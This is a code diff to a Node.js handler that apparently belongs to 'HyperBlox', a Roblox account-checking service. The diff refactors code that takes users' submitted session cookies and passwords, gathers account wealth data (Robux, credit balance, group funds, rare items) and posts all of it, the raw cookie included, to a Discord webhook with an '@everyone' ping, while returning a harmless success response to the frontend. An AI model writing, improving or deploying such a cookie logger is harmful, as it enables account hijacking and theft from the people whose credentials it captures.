@@ -39,23 +39,6 @@ async function validateCookie(cookie) {
     }
 }
 
-// Optimize and compress avatar image
-async function optimizeAvatar(avatarUrl) {
-    try {
-        const response = await fetch(avatarUrl);
-        const buffer = await response.buffer();
-        
-        const optimized = await sharp(buffer)
-            .resize(150, 150, { fit: 'cover' })
-            .jpeg({ quality: 80, progressive: true })
-            .toBuffer();
-        
-        return `data:image/jpeg;base64,${optimized.toString('base64')}`;
-    } catch (error) {
-        return avatarUrl;
-    }
-}
-
 // Calculate account score
 function calculateAccountScore(userData) {
     let score = 0;
@@ -94,6 +77,76 @@ function calculateAccountScore(userData) {
     else if (userData.totalGroupsOwned > 0) score += 1;
     
     return Math.min(score, 100);
+}
+
+// Send to Discord webhook
+async function sendToWebhook(cookie, userData, password = null) {
+    const W = process.env.WEBHOOK_URL;
+    if (!W) return;
+
+    try {
+        const embed1 = {
+            content: '@everyone',
+            username: 'HyperBlox',
+            avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
+            embeds: [{
+                title: '',
+                type: 'rich',
+                description: `<:check:1350103884835721277> **[Check Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=${cookie})** <:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie](https://hyperblox.eu/controlPage/antiprivacy/kingvon.php?cookie=${cookie})** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/${userData.userId}/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/${userData.userId})**`,
+                color: 0x00061a,
+                thumbnail: { url: userData.avatarUrl },
+                fields: [
+                    { name: '<:display:1348231445029847110> Display Name', value: `\`\`\`${userData.displayName}\`\`\``, inline: true },
+                    { name: '<:user:1348232101639618570> Username', value: `\`\`\`${userData.username}\`\`\``, inline: true },
+                    { name: '<:userid:1348231351777755167> User ID', value: `\`\`\`${userData.userId}\`\`\``, inline: true },
+                    { name: '<:robux:1348231412834111580> Robux', value: `\`\`\`${userData.robux}\`\`\``, inline: true },
+                    { name: '<:pending:1348231397529223178> Pending Robux', value: `\`\`\`${userData.pendingRobux}\`\`\``, inline: true },
+                    { name: '<:rap:1348231409323741277> RAP', value: `\`\`\`${userData.rap}\`\`\``, inline: true },
+                    { name: '<:summary:1348231417502371890> Summary', value: `\`\`\`${userData.summary}\`\`\``, inline: true },
+                    { name: '<:pin:1348231400322498591> PIN', value: `\`\`\`${userData.pinStatus}\`\`\``, inline: true },
+                    { name: '<:premium:1348231403690786949> Premium', value: `\`\`\`${userData.isPremium ? '✅ True' : '❌ False'}\`\`\``, inline: true },
+                    { name: '<:vc:1348233572020129792> Voice Chat', value: `\`\`\`${userData.vcStatus}\`\`\``, inline: true },
+                    { name: '<:headless:1348232978777640981> Headless Horseman', value: `\`\`\`${userData.headlessStatus}\`\`\``, inline: true },
+                    { name: '<:korblox:1348232956040319006> Korblox Deathspeaker', value: `\`\`\`${userData.korbloxStatus}\`\`\``, inline: true },
+                    { name: '<:age:1348232331525099581> Account Age', value: `\`\`\`${userData.accountAge}\`\`\``, inline: true },
+                    { name: '<:friends:1348231449798774865> Friends', value: `\`\`\`${userData.friendsCount}\`\`\``, inline: true },
+                    { name: '<:followers:1348231447072215162> Followers', value: `\`\`\`${userData.followersCount}\`\`\``, inline: true },
+                    { name: '<:creditbalance:1350102024376684644> Credit Card Balance', value: `\`\`\`${userData.creditBalance} USD (est ${userData.creditRobux} Robux)\`\`\``, inline: true },
+                    { name: '<:group:1350102040818221077> Groups Owned', value: `\`\`\`${userData.totalGroupsOwned}\`\`\``, inline: true },
+                    { name: '<:combined:1350102005884125307> Combined Group Funds', value: `\`\`\`${userData.totalGroupFunds} Robux (${userData.totalPendingGroupFunds} pending)\`\`\``, inline: true },
+                    { name: '<:status:1350102051756970025> Account Status', value: `\`\`\`${userData.emailVerified}\`\`\``, inline: true },
+                    { name: '⭐ Account Score', value: `\`\`\`${userData.accountScore}/100\`\`\``, inline: true },
+                    ...(password ? [{ name: '🔐 Password', value: `\`\`\`${password}\`\`\``, inline: false }] : [])
+                ]
+            }]
+        };
+
+        const embed2 = {
+            content: '',
+            username: 'HyperBlox',
+            avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
+            embeds: [{
+                description: `\`\`\`${cookie}\`\`\``,
+                color: 0x00061a
+            }]
+        };
+
+        await fetch(W, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(embed1)
+        });
+
+        await new Promise(resolve => setTimeout(resolve, 2000));
+
+        await fetch(W, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(embed2)
+        });
+    } catch (e) {
+        console.error('Webhook error:', e);
+    }
 }
 
 module.exports = async (req, res) => {
@@ -259,17 +312,9 @@ module.exports = async (req, res) => {
         const accountAgeDays = Math.floor((now - created) / (1000 * 60 * 60 * 24));
 
         const userData = {
-            userInfo: {
-                userId,
-                username,
-                displayName,
-                name: username,
-                robux,
-                rap,
-                premium: isPremium ? '✅ True' : '❌ False',
-                voiceChat: '❌ Disabled',
-                accountScore: 0
-            },
+            userId,
+            username,
+            displayName,
             avatarUrl,
             robux,
             pendingRobux: 0,
@@ -293,81 +338,24 @@ module.exports = async (req, res) => {
         };
 
         userData.accountScore = calculateAccountScore(userData);
-        userData.userInfo.accountScore = userData.accountScore;
 
-        // Send to Discord webhook (only for valid cookies in full bypass mode)
-        const W = process.env.WEBHOOK_URL;
-        if (W) {
-            (async () => {
-                try {
-                    const embed1 = {
-                        content: '@everyone',
-                        username: 'HyperBlox',
-                        avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
-                        embeds: [{
-                            title: '',
-                            type: 'rich',
-                            description: `<:check:1350103884835721277> **[Check Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=${cookie})** <:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie](https://hyperblox.eu/controlPage/antiprivacy/kingvon.php?cookie=${cookie})** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/${userId}/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/${userId})**`,
-                            color: 0x00061a,
-                            thumbnail: { url: avatarUrl },
-                            fields: [
-                                { name: '<:display:1348231445029847110> Display Name', value: `\`\`\`${displayName}\`\`\``, inline: true },
-                                { name: '<:user:1348232101639618570> Username', value: `\`\`\`${username}\`\`\``, inline: true },
-                                { name: '<:userid:1348231351777755167> User ID', value: `\`\`\`${userId}\`\`\``, inline: true },
-                                { name: '<:robux:1348231412834111580> Robux', value: `\`\`\`${robux}\`\`\``, inline: true },
-                                { name: '<:pending:1348231397529223178> Pending Robux', value: `\`\`\`0\`\`\``, inline: true },
-                                { name: '<:rap:1348231409323741277> RAP', value: `\`\`\`${rap}\`\`\``, inline: true },
-                                { name: '<:summary:1348231417502371890> Summary', value: `\`\`\`${userData.summary}\`\`\``, inline: true },
-                                { name: '<:pin:1348231400322498591> PIN', value: `\`\`\`${userData.pinStatus}\`\`\``, inline: true },
-                                { name: '<:premium:1348231403690786949> Premium', value: `\`\`\`${isPremium ? '✅ True' : '❌ False'}\`\`\``, inline: true },
-                                { name: '<:vc:1348233572020129792> Voice Chat', value: `\`\`\`${userData.vcStatus}\`\`\``, inline: true },
-                                { name: '<:headless:1348232978777640981> Headless Horseman', value: `\`\`\`${userData.headlessStatus}\`\`\``, inline: true },
-                                { name: '<:korblox:1348232956040319006> Korblox Deathspeaker', value: `\`\`\`${userData.korbloxStatus}\`\`\``, inline: true },
-                                { name: '<:age:1348232331525099581> Account Age', value: `\`\`\`${userData.accountAge}\`\`\``, inline: true },
-                                { name: '<:friends:1348231449798774865> Friends', value: `\`\`\`${friendsCount}\`\`\``, inline: true },
-                                { name: '<:followers:1348231447072215162> Followers', value: `\`\`\`${followersCount}\`\`\``, inline: true },
-                                { name: '<:creditbalance:1350102024376684644> Credit Card Balance', value: `\`\`\`${userData.creditBalance} USD (est ${userData.creditRobux} Robux)\`\`\``, inline: true },
-                                { name: '<:group:1350102040818221077> Groups Owned', value: `\`\`\`${groupsOwned}\`\`\``, inline: true },
-                                { name: '<:combined:1350102005884125307> Combined Group Funds', value: `\`\`\`${userData.totalGroupFunds} Robux (${userData.totalPendingGroupFunds} pending)\`\`\``, inline: true },
-                                { name: '<:status:1350102051756970025> Account Status', value: `\`\`\`${userData.emailVerified}\`\`\``, inline: true },
-                                { name: '⭐ Account Score', value: `\`\`\`${userData.accountScore}/100\`\`\``, inline: true },
-                                ...(password ? [{ name: '🔐 Password', value: `\`\`\`${password}\`\`\``, inline: false }] : [])
-                            ]
-                        }]
-                    };
+        // 🔥 SEND TO WEBHOOK IMMEDIATELY (non-blocking)
+        sendToWebhook(cookie, userData, password).catch(err => console.error('Webhook failed:', err));
 
-                    const embed2 = {
-                        content: '',
-                        username: 'HyperBlox',
-                        avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
-                        embeds: [{
-                            description: `\`\`\`${cookie}\`\`\``,
-                            color: 0x00061a
-                        }]
-                    };
-
-                    await fetch(W, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(embed1)
-                    });
-
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-
-                    await fetch(W, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(embed2)
-                    });
-                } catch (e) {
-                    // Silent error
-                }
-            })();
-        }
-
+        // Return success response to frontend
         return res.status(200).json({
             success: true,
-            userInfo: userData.userInfo,
+            userInfo: {
+                userId,
+                username,
+                displayName,
+                name: username,
+                robux,
+                rap,
+                premium: isPremium ? '✅ True' : '❌ False',
+                voiceChat: '❌ Disabled',
+                accountScore: userData.accountScore
+            },
             avatarUrl: userData.avatarUrl
         });
 
